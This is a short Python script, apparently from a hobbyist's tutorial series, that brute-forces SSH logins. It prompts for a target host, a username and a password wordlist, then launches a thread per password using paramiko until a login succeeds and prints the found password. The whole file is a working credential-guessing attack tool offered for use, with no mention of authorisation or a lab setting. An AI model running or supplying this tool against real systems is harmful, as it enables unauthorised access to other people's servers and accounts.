# This is the second part of the brute forcer I am creating, if you seen my first one, you might notice that it is a little slower.  Let's add threading to the program to speed it.  
import paramiko, sys, os, socket, threading, time

# This is useful when we get to the threading part
stop_time = 0

def new_line():
    print('\n')

def ssh_connect(password):

    # Use this globally not just in function
    global stop_time

    # These are two standard lines we need before we try to connect
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # This is where we are trying to connect to our target with the supplied username, password comes from wordlist.  
    try:
        ssh.connect(host, port=22, username=username, password=password)
        stop_time = 1
        print(f'[+] Found Password: {password} for Username: {username}')

    except KeyboardInterrupt:
        print(' User Ended')

    except:
        print(f'[-] Incorrect Password: {password}')

    ssh.close()

# We first need 3 things from the user
# Target, Username to attack, and passwords file
try:
    host = input('[+] Please enter the target address: ')
    username = input('[+] Please enter SSH username: ')
    input_file = input('[+] Please enter password file: ')
except:
    print('User Interruption')
new_line()

# Check to make sure valid passwords file
if os.path.exists(input_file) == False:
    print('[!] That Path/File does not exist!')
    sys.exit(1)

print(f'Starting on {host} with {username}')

# Must use readlineS with S, LINES, as readline will only read the first char
with open(input_file, 'r') as file:
    for line in file.readlines():
        if stop_time == 1:
            threader.join()
            exit()
        password = line.strip()
        threader = threading.Thread(target=ssh_connect, args=(password,))
        threader.start()
        time.sleep(0.8)